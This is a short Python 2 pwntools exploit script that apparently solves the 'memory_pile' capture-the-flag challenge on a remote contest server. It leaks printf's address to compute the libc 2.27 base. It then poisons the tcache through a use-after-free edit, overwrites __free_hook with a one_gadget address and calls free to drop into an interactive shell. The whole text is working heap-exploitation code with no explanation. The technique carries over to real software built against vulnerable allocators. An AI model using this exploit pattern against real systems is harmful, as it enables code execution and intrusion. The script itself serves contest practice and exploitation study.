from pwn import *
#p=process('./memory_pile')
p = remote('chal.imaginaryctf.org', 42007)
elf = ELF('./memory_pile')
libc = ELF('libc-2.27.so')
#raw_input("DEBUG")

p.recvuntil('it...\n')
printf = int(p.recv(14),16)
base = printf - libc.symbols['printf']
print "Base: ",hex(base)
free_hook = base + libc.symbols['__free_hook']
print "free_hook: ",hex(free_hook)
#0x4f365 0x4f3c2 0x10a45c
one = base + 0x4f3c2
print "One: ",hex(one)


def malloc(idx):
	p.recv()
	p.sendline('1')
	p.recv()
	p.sendline(str(idx))

def free(idx):
	p.recv()
	p.sendline('2')
	p.recv()
	p.sendline(str(idx))

def edit(idx,data):
	p.recv()
	p.sendline('3')
	p.recv()
	p.sendline(str(idx))
	p.recv()
	p.sendline((data))


malloc(0)
free(0)
edit(0,p64(free_hook))
malloc(0)
malloc(0)
edit(0,p64(one))
free(0)
print "Done"


p.interactive()